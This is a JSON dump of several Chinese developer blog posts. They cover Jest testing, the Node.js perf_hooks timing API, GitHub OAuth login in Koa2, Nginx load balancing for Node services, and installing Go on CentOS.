1234567891011121314151617test('fibdeep 数据测试 0 - 15', () =&gt; &#123; for (let i = 0; i &lt; 15; i++) &#123; expect(fibdeep(i)).toBe(fibarr(i)); &#125;&#125;);test('fibgen 数据测试 0 - 15', () =&gt; &#123; for (let i = 0; i &lt; 15; i++) &#123; expect(fibgen(i)).toBe(fibarr(i)); &#125;&#125;);test('fibdeep, fibgen 交叉数据测试 0 - 15', () =&gt; &#123; for (let i = 0; i &lt; 15; i++) &#123; expect(fibgen(i)).toBe(fibdeep(i)); &#125;&#125;); 最后查看测试结果： 模块可以使用describe来声明模块区域： 123456789describe('这是一个模块区域', () =&gt; &#123; test('这个区域的第一个 test', () =&gt; &#123; // ... &#125;); test('这个区域的第二个 test', () =&gt; &#123; // ... &#125;);&#125;); MatchersJest使用匹配器，让您以不同的方式测试值。因为有太多不同的匹配器需要记忆，所以这里只会尝试介绍最有用的。 toEqualtoEqual会对两个对象/数组进行深度的对比，还会分析 diff 12345678910111213141516171819test('深度对比', () =&gt; &#123; const t1 = &#123; \"error\": &#123; \"message\": \"请刷新重试\", \"code\": 120001, \"name\": \"ERR_VERITY_SESSION\" &#125; &#125;; const t2 = &#123; \"error\": &#123; \"message\": \"请刷新重试\", \"code\": 120002, \"name\": \"ERR_VERITY_SESSION\" &#125; &#125;; expect(t1).toEqual(t2);&#125;); 测试结果： 轻易找出了 t1, t2 两个对象的不同地方。 真值在测试中，有时需要进行区分 undefined，null 以及 false，但你有时不想区别对待这些。Jest帮助你，让你明确你想要什么。（记忆起来也是挺困难的）。 12345678test(\"'false'\", () =&gt; &#123; const z = 'false'; expect(z).not.toBeNull(); // 不是 null expect(z).toBeDefined(); // 是 defined，与 undefined 相反 expect(z).not.toBeUndefined(); // 不是 undefined expect(z).not.toBeTruthy(); // !!后 不是 true expect(z).toBeFalsy(); // !!后 是 false&#125;); 数字12345678910test('two plus two', () =&gt; &#123; const value = 2 + 2; expect(value).toBeGreaterThan(3); // 大于 3 expect(value).toBeGreaterThanOrEqual(3.5); // 大于或等于 3.5 expect(value).toBeLessThan(5); // 小于 5 expect(value).toBeLessThanOrEqual(4.5); // 小于或等于 4.5 expect(value).toBe(4); // 等于 4 expect(value).toEqual(4); // 等于 4 [深度]&#125;); 字符串12345678// 可以使用正则test('there is no I in team', () =&gt; &#123; expect('team').not.toMatch(/I/); // 不包含 i&#125;);test('but there is a \"stop\" in Christoph', () =&gt; &#123; expect('Christoph').toMatch(/stop/); // 包含 stop&#125;); 数组数组的 Api 实在太多了，更多的去查文档。 1234567891011const shoppingList = [ 'diapers', 'kleenex', 'trash bags', 'paper towels', 'beer',];test('the shopping list has beer on it', () =&gt; &#123; expect(shoppingList).toContain('beer'); // 包含 beer&#125;); 异步测试JavaScript 中常见的代码是异步运行的。当您有异步运行的代码时，Jest 需要知道它正在测试的代码何时完成，才能进入另一个测试。Jest 有几种方法来处理这个问题。 回调最常见的异步模式是回调，当使用回调时，要调用参数的 done 函数，不然会无法识别。 12345678test('异步测试', done =&gt; &#123; function callback(data) &#123; expect(data).toBe('peanut butter'); done(); &#125; fetchData(callback);&#125;); Promises只要从你的测试中得到 Promise，Jest 将等待这个 Promise 来 resolve。如果 Promise 被 reject，测试将自动失败。 12345678910111213141516test('异步测试', () =&gt; &#123; return fetchData().then(data =&gt; &#123; expect(data).toBe('peanut butter'); &#125;);&#125;);// 或者fetch('https://www.zhihu.com/api/v3/oauth/captcha') .then(res =&gt; res.json()) .then(json =&gt; &#123; console.log(json); test('异步测试', () =&gt; &#123; expect(json).not.toBeUndefined(); &#125;) &#125;); Async/Await最简单的是使用 Async, Await 123test('the data is peanut butter', async () =&gt; &#123; await expect(fetchData()).resolves.toBe('peanut butter');&#125;); 测试 React 组件先安装几个模块：babel-jest，react-test-renderer，jest。 开始测试，首先准备组件。 123456789101112131415161718192021222324252627// Link.react.test.jsimport React from 'react';import Link from '../Link.react'; // 要测试的组件import renderer from 'react-test-renderer'; // 测试工具test('Link changes the class when hovered', () =&gt; &#123; const component = renderer.create( &lt;Link page=\"http://www.facebook.com\"&gt;Facebook&lt;/Link&gt;, ); // 渲染结果 let tree = component.toJSON(); expect(tree).toMatchSnapshot(); // 调用 props tree.props.onMouseEnter(); // 再开开渲染结果 tree = component.toJSON(); expect(tree).toMatchSnapshot(); // 再调用 props tree.props.onMouseLeave(); // 再看看渲染结果 tree = component.toJSON(); expect(tree).toMatchSnapshot();&#125;); 重要的命令行参数1234--bail // 第一个失败的测试，立即退出测试。--json // 以 JSON 打印测试结果。--expand // 别名 -e，完全显示差异和错误。--coverage // 收集测试覆盖率信息并在输出中报告。 Babel-Jest有时候测试的文件是 es6 代码，或者是 jsx，这时候要使用 babel-jest。 123456\"jest\": &#123; \"verbose\": true, \"transform\": &#123; \"^.+\\\\.js$\": \"babel-jest\" &#125;&#125;, 参考资料 http://facebook.github.io/jest/docs/zh-Hans/getting-started.html#content","categories":[{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/categories/测试/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/tags/测试/"},{"name":"Jest","slug":"Jest","permalink":"http://me.lizhooh.com/tags/Jest/"}]},{"title":"解读 Nodejs 性能 API：Performance Timing","slug":"Nodejs/解读 Nodejs 性能 API","date":"2017-09-16T03:02:31.000Z","updated":"2021-06-15T06:10:52.846Z","comments":true,"path":"/stories/2017/09/Nodejs/解读 Nodejs 性能 API/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/Nodejs/解读 Nodejs 性能 API/","excerpt":"前言本周末，我花了一点时间去查看与学习 Nodejs v8.5.0 更新的内容，其中一点就包括了与性能时间相关的 API，看起来感觉还是比较有趣的。 在 Nodejs v8.5.0 里新增了与性能时间相关的 API：Performance Timing。它提供了 W3C Performance Timeline 规范的实现，该 API 目的是支持高精度性能指标的收集，保存和获取性能相关的度量数据。 Performance Timing 是基于 libuv 内的高精度时间模块 uv_hrtime 来实现。 下面简单粗糙的介绍 Performance Timing。","text":"前言本周末，我花了一点时间去查看与学习 Nodejs v8.5.0 更新的内容，其中一点就包括了与性能时间相关的 API，看起来感觉还是比较有趣的。 在 Nodejs v8.5.0 里新增了与性能时间相关的 API：Performance Timing。它提供了 W3C Performance Timeline 规范的实现，该 API 目的是支持高精度性能指标的收集，保存和获取性能相关的度量数据。 Performance Timing 是基于 libuv 内的高精度时间模块 uv_hrtime 来实现。 下面简单粗糙的介绍 Performance Timing。 PerformancePerformance Timing 被放置到 perf_hooks 模块里： 1234const &#123; performance, PerformanceObserver&#125; = require('perf_hooks'); Performance 对象的作用是提供对 “性能时间表” 的访问，这是由 Node.js 进程和用户代码维护的。在内部，性能时间表只不过是一个 PerformanceEntry 对象的数组，通常它们是按照顺序来存储。 PerformanceEntry 对象最基本的结构包括了： 123456PerformanceEntry &#123; duration: 217.711151, // 持续时间 startTime: 1944738.703347, // 开始记录时的时间戳 entryType: 'function', // 类型 name: 'myFunction' // 名称&#125; PerformanceEntry 可以指定多种类型，目前仅支持：node，frame，mark，measure，gc，和 function。 Nodejs 进程时间当 Nodejs 应用启动时，Nodejs 会默认添加几个 PerformanceEntry 实例到 “性能时间表” 里。而第一个 PerformanceEntry 实例是用于记录 Nodejs 进程启动时的性能参数。 可以通过 perf_hooks.performance.nodeTiming 来访问它。 目前可以看到的属性包括了： 12345678910111213141516171819202122&gt; perf_hooks.performance.nodeFramePerformanceNodeTiming &#123; duration: 4512.380027, // 进程已激活的毫秒数 startTime: 158745518.63114, entryType: 'node', name: 'node', arguments: 158745518.756349, // 命令行参数处理完成的时间戳 initialize: 158745519.09161, // Nodejs 完成初始化的时间戳 inspectorStart: 158745522.408488, // Nodejs 检查器启动完成的时间戳 loopStart: 158745613.442409, // Nodejs 事件循环开始的时间戳 loopExit: 0, // Nodejs 事件循环退出的时间戳 loopFrame: 158749857.025862, // Nodejs 事件循环的当前迭代开始的时间戳 bootstrapComplete: 158745613.439273, // Nodejs 引导过程完成的时间戳。 third_party_main_start: 0, // third party main 处理开始的时间戳 [没有时为 0] third_party_main_end: 0, // third party main 处理开始的时间戳 cluster_setup_start: 0, // 集群设置启动的时间戳 cluster_setup_end: 0, // 集群设置结束的时间戳 module_load_start: 158745583.850295, // 主模块加载开始的时间戳 module_load_end: 158745583.851643, // 主模块加载结束的时间戳 preload_modules_load_start: 158745583.852331, // 启动预加载模块加载的时间戳 preload_modules_load_end: 158745583.879369 // 预加载模块加载结束的时间戳&#125; 事件循环时序当 Nodejs 应用启动时，Nodejs 自动添加到 “性能时间表” 的第二个实例是用于记录 Nodejs 事件循环的时序。 可以通过 perf_hooks.performance.nodeFrame 来访问它。 目前可以看到的属性包括了： 12345678910&gt; perf_hooks.performance.nodeFramePerformanceFrame &#123; countPerSecond: 9.91151849696801, // 每秒事件循环迭代次数 count: 68, // 事件循环迭代的总数 prior: 0.124875, // 事件循环的上一次迭代所用的总毫秒数 entryType: 'frame', name: 'frame', duration: 128.827398, // 当前事件循环持续时间 startTime: 32623025.740256 // 事件循环的当前迭代开始的时间戳&#125; 用标志来测量我们知道，可以使用 setTimeout 来做一些延迟操作，比如在一秒后执行某个函数：setTimeout(myFunction, 1000)。 但，事实上真的是 1000ms 后执行吗？ 使用 performance 提供的 mark，可以轻易的计算出时间差。 1234567891011121314151617181920212223242526const &#123; performance,&#125; = require('perf_hooks');performance.mark('A'); // 标志一下setTimeout(() =&gt; &#123; performance.mark('B'); // 再标记一下 // performance.measure(name, startMark, endMark): 在性能时间表里添加一项 performance.measure('A to B', 'A', 'B'); // PerformanceEntry 对象 const entry = performance.getEntriesByName('A to B')[0]; console.log(entry); /* 输出结果： PerformanceEntry &#123; duration: 1002.693559, startTime: 4259805.238914, entryType: 'measure', name: 'A to B' &#125; */&#125;, 1000); 你会发现，它多出了 2ms，哇哇坑坑的。 测量函数的执行时间还可以使用 PerformanceObserver 订阅 &#39;function&#39; 类型。每次调用包装函数时，时序数据将自动添加到 “性能时间表”。 下面通过简单的示例来测量函数的执行时间。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950const &#123; performance, PerformanceObserver&#125; = require('perf_hooks');let result = [];function fib(n) &#123; if (n == 1 || n == 2) &#123; return 1; &#125; return fib(n - 1) + fib(n - 2);&#125;// timerify: 在一个新函数中包装一个函数，用于测量包装函数的运行时间const myfib = performance.timerify(fib);// 有对象添加到性能时间表时，发出通知const obs = new PerformanceObserver((list, observer) =&gt; &#123; // PerformanceEntry 对象列表 const entries = list.getEntries(); entries.forEach((entry, index) =&gt; &#123; // entry[0] 是第一个参数的值，如此类推 console.log(`$&#123;entry.name&#125;($&#123;entry[0]&#125;) = $&#123;result[index]&#125;, run time:`, entry.duration, 'ms'); &#125;); // 断开 PerformanceObserver 实例与所有通知的连接。 obs.disconnect(); // 从性能时间表中清除所有对象 performance.clearFunctions();&#125;);// buffered 为 true 表示异步通知，默认是同步通知obs.observe(&#123; entryTypes: ['function'], buffered: true &#125;);result.push( myfib(5), myfib(10), myfib(20), myfib(30),);/* 输出结果： fib(5) = 5, run time: 0.001568 ms fib(10) = 55, run time: 0.005568 ms fib(20) = 6765, run time: 2.007623 ms fib(30) = 832040, run time: 7.03683 ms*/ 可以看到，进度到达了微秒级别。 测量模块加载时间还可以使用一种特别有趣的方式是测量 Nodejs 应用中为每个模块依赖关系加载时间： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950const &#123; performance, PerformanceObserver&#125; = require('perf_hooks');const mod = require('module');// 依赖模块mod.Module.prototype.require =performance.timerify(mod.Module.prototype.require);require = performance.timerify(require);const obs = new PerformanceObserver((list, observer) =&gt; &#123; const entries = list.getEntries(); entries.forEach((entry) =&gt; &#123; console.log(`require('$&#123;entry[0]&#125;')`, entry.duration, 'ms'); &#125;); obs.disconnect(); performance.clearFunctions();&#125;);obs.observe(&#123; entryTypes: ['function'], buffered: true &#125;);const fetch = require('node-fetch');/* 输出结果： require('node-fetch') 32.271811 ms require('url') 0.006979 ms require('url') 0.005748 ms require('http') 6.021816 ms require('https') 8.655848 ms require('zlib') 1.569498 ms require('stream') 0.00739 ms require('./lib/body') 11.224192 ms require('encoding') 5.052119 ms require('iconv-lite') 3.416933 ms require('buffer') 0.005747 ms require('./bom-handling') 0.550125 ms require('./streams') 0.641265 ms require('buffer') 0.004927 ms require('stream') 0.002463 ms require('./extend-node') 0.714342 ms require('buffer') 0.004927 ms ... 省略 n 个*/ 测量 GC 活动的情况使用 entryTypes: [&#39;gc&#39;] 可以测量 GC 活动的情况。observe 后，每次 GC 活动时，都会添加到性能时间表里。 12345678910111213141516171819202122232425const &#123; performance, PerformanceObserver&#125; = require('perf_hooks');const obs = new PerformanceObserver((list) =&gt; &#123; console.log(list.getEntries()); performance.clearGC(); /* 输出结果： [ PerformanceEntry &#123; duration: 0.89498, // gc 持续了 0.89498 ms startTime: 6039754.909044, entryType: 'gc', name: 'gc', kind: 1 &#125; ] */&#125;);obs.observe(&#123; entryTypes: ['gc'] &#125;); 细节可能会改变API Performance Timing 是 v8.5.0 新增的，目前稳定性为 1，具体的细节可能会改变，敬请留意。 参考资料 https://medium.com/the-node-js-collection/timing-is-everything-6d43fc9fd416 https://nodejs.org/dist/latest-v8.x/docs/api/perf_hooks.html","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Github 授权登录 Nodejs 的实现","slug":"Nodejs/Github 授权登录 Nodejs 的实现","date":"2017-09-15T01:25:35.000Z","updated":"2021-06-15T06:10:52.833Z","comments":true,"path":"/stories/2017/09/Nodejs/Github 授权登录 Nodejs 的实现/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/Nodejs/Github 授权登录 Nodejs 的实现/","excerpt":"前言第三方登录太常见了，基本都是一个必备的功能。现在的第三方登录主要是基于 OAuth 2.0 来实现的。而 OAuth 2.0 协议为用户资源的授权提供了一个安全的、开放而又简易的标准。与以往的授权方式不同之处是 OAuth 的授权不会使第三方触及到用户的帐号信息（如用户名与密码），即第三方无需使用用户的用户名与密码就可以申请获得该用户资源的授权，因此 OAuth 是安全的。 本来是想试试 QQ 的授权登录，后来发现 QQ 的授权登录太麻烦了，又要各种申请，提交资料，还要上传身份证图片，坑爹的。算了，对于一个开发者来说，还是尝试一下Github吧。","text":"前言第三方登录太常见了，基本都是一个必备的功能。现在的第三方登录主要是基于 OAuth 2.0 来实现的。而 OAuth 2.0 协议为用户资源的授权提供了一个安全的、开放而又简易的标准。与以往的授权方式不同之处是 OAuth 的授权不会使第三方触及到用户的帐号信息（如用户名与密码），即第三方无需使用用户的用户名与密码就可以申请获得该用户资源的授权，因此 OAuth 是安全的。 本来是想试试 QQ 的授权登录，后来发现 QQ 的授权登录太麻烦了，又要各种申请，提交资料，还要上传身份证图片，坑爹的。算了，对于一个开发者来说，还是尝试一下Github吧。 Github 授权登入先将下原理吧，其实 Github 文档说得很清楚的。相关可以查看：GitHub Developer 通过 GitHub 账号授权登入的过程主要包括三个方面： 获取 code： 第三方客户端向 https://github.com/login/oauth/authorize 发送 get 请求，带上?client_id=XXXXXX的参数，这时会跳转到 GitHub 登入页面，授权后GitHub 会向客户端返回 https://redirect_url?code=XXXXXX 。其中client_id和redirect_url是第三方事先在 GitHub 平台上配置好的。 通过 code 获取 access_token：客户端处理 https://redirect_url?code=XXXXXX 请求，获取 code 值，之后向 https://github.com/login/oauth/access_token 发起 post 请求，请求参数为 client_di，client_secret 和 code。 通过 access_token 获取用户 GitHub 账号信息：第二步的请求会返回这样 access_token = d0686dc49a22d64e77402db072b719f510f22421&amp;scope=user&amp;token_type=bearer 的内容，只需要向 https://api.github.com/user?access_token=xxx 发送 GET 请求，即可获取到登录用户的基本信息。 又分为几个实现步骤： GitHub 注册应用 Github 授权请求（获取 code） 授权回掉处理（获取 access_token） 获取 GitHub 账号信息 补充：下面的示例代码基于Koa2来实现。 GitHub 注册应用首先，确保你有一个 Github 账号。在用户的头像处，点击 Setting 进入设置页面。找到 Developer settings 里的 OAuth Apps，选择新建一个 app 。 之后，填写对应的信息。 之后就可以看到 client Id 和 client Secret，用于后面向 GitHub 发送请求传参。 Github 授权请求（获取 code）在页面中添加 GitHub 登入跳转按钮，并在路由中对跳转请求进行转发处理： 123&lt;a href=\"/github/login\"&gt; &lt;Icon type=\"github\" style=&#123;&#123;fontSize: 20, color: '#333'&#125;&#125;/&gt;&lt;/a&gt; 注意，并不是在前端用 windows.location.href 来转跳，而是后端重定向。 12const github = require('./github');router.use('/github', github.routes(), github.allowedMethods()); 123456789101112131415161718192021const config = require('../config');const qs = require('qs');const Router = require('koa-router');const router = new Router();router .get('/login', async (ctx) =&gt; &#123; // 重定向到认证接口,并配置参数 let path = \"https://github.com/login/oauth/authorize\"; path += qs.stringify(&#123; client_id: config.client_id, scope: config.scope, state: Date.now(), &#125;) // 重定向到授权服务器 ctx.redirect(path); &#125;)module.exports = router; 在 config 中事先添加配置请求所需参数 client_id，client_secret 和 scope。 123456module.exports = &#123; 'database': 'mongodb://localhost:27017/test-login', 'client_id': 'xxxxxxxxxxxxx', // 你的 client_id 'client_secret': 'xxxxxxxxxxxxxxxxxxxxxxxxxxx', // 你的 client_secret 'scope': ['user'],&#125;; 其中 scope 参数可选。就是你期待你的应用需要调用 Github 哪些信息，可以填写多个，以逗号分割，比如：scope=user,public_repo。state 参数非必需，用于防治跨域伪造请求攻击。 那么试试看，如何？ 看，已经转跳到授权登录的页面了。 授权回掉处理（获取 access_token）当你点击 Authorize Lizhooh 时，Github 就会把必要的参数通过你配置的回调地址传给你。 点击授权后回调：http://127.0.0.1:3000/github/oauth?code=xxxxxx 在这里把 /github/oauth 补上： 123456789101112131415161718192021222324252627.get('/github/oauth', async ctx =&gt; &#123; const code = ctx.query.code; console.log(code); let path = 'https://github.com/login/oauth/access_token'; // 获取用户 token，注意自行添加 node-fetch 模块 const data = await fetch(path, &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; client_id: config.client_id, client_secret: config.client_secret, code: code &#125;) &#125;) .then(res =&gt; res.text()) .catch(err =&gt; console.error(err)); console.log(data); ctx.body = &#123; ...qs.parse(data), &#125;&#125;) GitHub 返回回掉地址时，先拿到请求中的 code 参数，然后向 https://github.com/login/oauth/access_token 发送 post 请求并带上client_id,client_secret,code参数，请求成功后会返回带有 access_token 的信息。 token 在登录注册是一个非常重要的字符串，它确保的避免使用账号与密码来验证用户的登录状态。 获取到 access_token 之后，就应该把它放进数据库好好保存，同时也可以把 state 等数据保存一下，这样可以知道登录的时间。 获取 GitHub 账号信息最后带上获取的 access_token 请求 https://api.github.com/user?access_token=xxx, 返回的就是之前 scope 中对应的账号信息。 123456789101112.get('/github/oauth', async ctx =&gt; &#123; // 省略上面的代码 const &#123; access_token &#125; = qs.parse(data); const user = await fetch('https://api.github.com/user?access_token=' + access_token) .then(res =&gt; res.json()) .catch(err =&gt; console.error(err)); ctx.body = &#123; ...user, &#125;&#125;) 最后，授权登录成功后，你就可以根据 token 来获取用户的信息，包括了头像，名称等信息。 之后，为了维持用户的登录状态与信息，你需要把这些信息储存在数据库里，以便以后使用。 总结最后，可以用所有的流程，可以用一张图片来概括。 扩展除此之外，如果你的应用还需要集成更多的其它第三方登录，那么需要写很多不同的登录代码，因为每个第三方登录的 SDK 都不同。这时是不是在想，会不会有人已经封装好模块，提供简单配置的方式实现第三方登录。 是的，有个叫passport.js，它集成了众多的第三方登录策略，只需要简单的提供一些配置项。 比如你可以使用，这些模块省去众多的代码编写。 123npm install passport-github2npm install passport-qqnpm install passport-weibo 注意：涉及登录注册等保密操作时，在使用别人开发的模块时，建议认真阅读源码，查看是否有黑点。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"使用 Nginx 负载均衡 Nodejs 服务","slug":"Nodejs/使用 Nginx 均衡负载 Nodejs 服务","date":"2017-09-14T06:40:42.000Z","updated":"2021-06-15T06:10:52.842Z","comments":true,"path":"/stories/2017/09/Nodejs/使用 Nginx 均衡负载 Nodejs 服务/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/Nodejs/使用 Nginx 均衡负载 Nodejs 服务/","excerpt":"前言Nginx (engine x) 是一个高性能的HTTP和反向代理服务器。在之前使用 Nodejs 的 Cluster 模块对 Nodejs 进行多核 CPU 分布式集群的探索。现在使用 Nginx 负载均衡 Nodejs 服务。","text":"前言Nginx (engine x) 是一个高性能的HTTP和反向代理服务器。在之前使用 Nodejs 的 Cluster 模块对 Nodejs 进行多核 CPU 分布式集群的探索。现在使用 Nginx 负载均衡 Nodejs 服务。 window 上配置 Nginx在 window 上配置 Nginx 非常简单，只需要安装，解压，启动即可。 在官网（http://nginx.org/）上下载，并解压 点击 nginx.exe 启动，之后 nginx 自动会加到 window 服务里，重启会自动启动服务。 在浏览器上输入 http://127.0.0.1，可以看到 nginx 的欢迎页。 如果想要关闭/重启 nginx，去到 nginx 目录，使用 nginx.exe -s stop 代理打开 nginx 的配置文件：nginx.conf，添加以下内容 123456789101112131415161718192021# 大概在 35 行server &#123; listen 80; # 注意 server_name localhost; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root html; index index.html index.htm; # 下面是添加的 proxy_pass http:// 127.0.0.1:3000; proxy_redirect default; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"upgrade\"; proxy_set_header Host $host; &#125;# ... 这样配置后，nginx 会把80端口的请求，代理到3000来处理。 之后重启 nginx，再打开 http://127.0.0.1 发现报 504。原因是没有在3000端口提供服务。 编写一个测试 http 服务： 1234567891011121314151617181920212223const Koa = require('koa');const Router = require('koa-router');const logger = require('koa-logger');const app = new Koa();const router = new Router();router .get('/', async ctx =&gt; &#123; ctx.body = 'hello world!'; &#125;) .get('/home', async ctx =&gt; &#123; ctx.body = 'home'; &#125;);app .use(logger()) .use(router.routes());app.listen(3000, () =&gt; &#123; console.log('server run in 3000');&#125;) 访问 http://127.0.0.1 发现输出 hello world。说明 nginx 成功把80端口的请求代理到3000端口。 负载均衡1234567891011121314151617181920212223upstream nodeserver &#123; server 127.0.0.1:3000; server 127.0.0.1:3001; keepalive 64;&#125;server &#123; listen 80; .... server_name localhost; .... location / &#123; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; proxy_set_header X-NginX-Proxy true; proxy_set_header Connection \"\"; proxy_http_version 1.1; proxy_pass http://nodeserver; # 与 upstream 后面的名称相同 &#125;&#125; 在上面使用 nginx 来做负载均衡，把80端口的请求均衡分配给3000，3001端口。而在 3000 与 3001 端口出运行着另个代码相同的 Nodejs 服务（只是监听的端口不同）。 为了证明它是否真的是，实现了负载均衡，我们可以尝试多次访问 http://127.0.0.1/home 。 第一次访问是，只看到 3000 端口出有输出，而 3001 处没输出。第二次访问时，看到 3001 处有输出，而 3000 处没输出。 Nginx 与 PM2 Cluster 有何不同？先来看看 PM2 是如何负载均衡的。之前已经写个一篇 《Nodejs 多核 CPU 分布式集群》 使用 Cluster 模块（多核处理模块），会把 Nodejs 分配运行在每个CPU上，所有 PM2 的负载均衡更适合于单个服务器。 而 nginx 通过把请求分配到不同端口/域名上，我们可以使用一台服务器来运行 nginx，多台服务来运行 Nodejs 应用。所以 nginx 的负载均衡更适合于多台服务器。 Nginx 与 PM2 Cluster 结合实现负载均衡PM2 Cluster 是对单台服务器而言的，而 nginx 是对多台服务器而言的，它们可以很好的结合在一起。 情景：我有5台服务器，每台服务器都是8 核 CPU的。现在把一台服务器设为运行Nginx用来提供负载均衡服务。而其余的四台运行Nodejs 提供 HTTP 服务。因为 Nodejs 是单线程运行的，所以它只会使用一个 CPU。为了避免不浪费 CPU（让空闲的 CPU 有活干）。使用 Cluster 模块（多核处理模块），让 Nodejs 运行在每个 CPU 上，实际上使用了 Cluster 后会提升2 ~ n倍的并发处理能力。 假设：现在有100w个 HTTP 请求需要处理，负载均衡后每台 HTTP 服务器平均需要处理25w，因为使用了 PM2 负载均衡，因此每个 CPU 平均需要负责处理25w/7 = 3.5w+个请求。 补充：为什么是 25w/7 ？ 可能你会想最大化的利用 CPU 个数，但是实际上为了避免 CPU 的竞争，我们会留出一个 CPU 给 PM2 用来分配任务。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"阿里云 CentOS 配置 Go 环境","slug":"Go/阿里云 CentOS 配置 Go 环境","date":"2017-09-12T04:42:58.000Z","updated":"2021-06-15T06:10:52.819Z","comments":true,"path":"/stories/2017/09/Go/阿里云 CentOS 配置 Go 环境/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/Go/阿里云 CentOS 配置 Go 环境/","excerpt":"前言记录着在阿里云 ECS CentOS 7 上配置 Go 运行环境。 另外说一下是，阿里云的 ECS 1核，2G 内存的服务器，CPU 用的是 E5-2682 V4 \\(“▔□▔)/！什么鬼，这么强。","text":"前言记录着在阿里云 ECS CentOS 7 上配置 Go 运行环境。 另外说一下是，阿里云的 ECS 1核，2G 内存的服务器，CPU 用的是 E5-2682 V4 \\(“▔□▔)/！什么鬼，这么强。 去查了一下，强爆了，有没有！！ 可以在这里查阅相关信息：https://help.aliyun.com/document_detail/25378.html 配置我下载的是 1.9.1 的版本，去 Golang 中国里寻找对应的 linux amd 版本：https://www.golangtc.com/download 12cd /homecurl https://www.golangtc.com/static/go/1.9.1/go1.9.1.linux-amd64.tar.gz -o go1.9.1.linux-amd64.tar.gz --progress 下载完成后进行解压： 1tar -xzf go1.9.1.linux-amd64.tar.gz 解压之后会多出一个 go 文件夹，就是解压后的文件。 之后把它移动到 /usr/local： 1mv ./go /usr/local/ 之后，把 Go bin 添加到环境变量里，这里先安装 nano，或者使用 vim。 12yum -y install nanonano /etc/profile 添加路径，添加在最后： 123456# golang PATHexport PATH=$PATH:/usr/local/go/bin# 额外设置export GOROOT=/usr/local/go # GOROOTexport GOPATH=/root/gopath # GOPATH 接着，刷新一下路径信息： 1source /etc/profile 检验结果： 1234go version# go version go1.9.1 linux/amd64go env GOPATH# /root/gopath 测试编写一段代码进行测试，能正常输出 3，就没有什么问题了。 12345678910111213package mainimport ( \"fmt\")func add(a int, b int) int &#123; return a + b;&#125;func main() &#123; fmt.Println(add(1, 2))&#125; 后台运行需要让 go 后台运行。 12go build hello.gonohup ./hello &amp; 如果没有 nohup 命令，先查找，再添加到路径。 12345678910which nohup# /usr/bin/nohupnano /etc/profile# nohup PATHexport PATH=$PATH:/usr/bin/nohup# 刷新source /etc/profile 查看进程运行，ps 或 top 命令。参考这篇文章：http://os.51cto.com/art/201101/244090.htm","categories":[{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/categories/Go/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/tags/Go/"}]},{"title":"浅谈 ES6 Set 的缺陷","slug":"ECMAScript/浅谈 ES6 Set 的缺陷","date":"2017-09-12T02:06:36.000Z","updated":"2021-06-15T06:10:52.813Z","comments":true,"path":"/stories/2017/09/ECMAScript/浅谈 ES6 Set 的缺陷/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/ECMAScript/浅谈 ES6 Set 的缺陷/","excerpt":"Set 集合在 ECMAScript 中，Array 表示一系列的有序元素，其中每一个元素都会带有自身处在这个集合的位置并以自然数作为标记。而在 ES6 最新规范里提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。具有没有排序概念，元素不可重发的特性。","text":"Set 集合在 ECMAScript 中，Array 表示一系列的有序元素，其中每一个元素都会带有自身处在这个集合的位置并以自然数作为标记。而在 ES6 最新规范里提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。具有没有排序概念，元素不可重发的特性。 基本用法创建 Set 集合，使用 Set 的构造函数。而 Set 本身是一个构造函数，用来生成 Set 数据结构。 12const s = new Set([2, 3, 5, 4, 5, 2, 2]);// 2, 3, 4, 5 Set 实例，可以使用析构语法来解析成数组 ...，因此可以使用 Set 轻易实现数组去重。 1[...Set([1, 2, 3, 3, 2, 1])] // [1, 2, 3] Set 属性与方法Set 有以下简单的属性： Set.prototype.constructor：构造函数，默认就是 Set 函数。 Set.prototype.size：返回 Set 实例的成员总数。 Set 有以下简单的方法： add(value)：添加某个值，返回 Set 结构本身。 delete(value)：删除某个值，返回一个布尔值，表示删除是否成功。 has(value)：返回一个布尔值，表示该值是否为 Set 的成员。 clear()：清除所有成员，没有返回值。 1234567891011s.add(1).add(2).add(2);// 注意2被加入了两次s.size // 2s.has(1) // trues.has(2) // trues.has(3) // falses.delete(2);s.has(2) // false 缺陷使用 Set 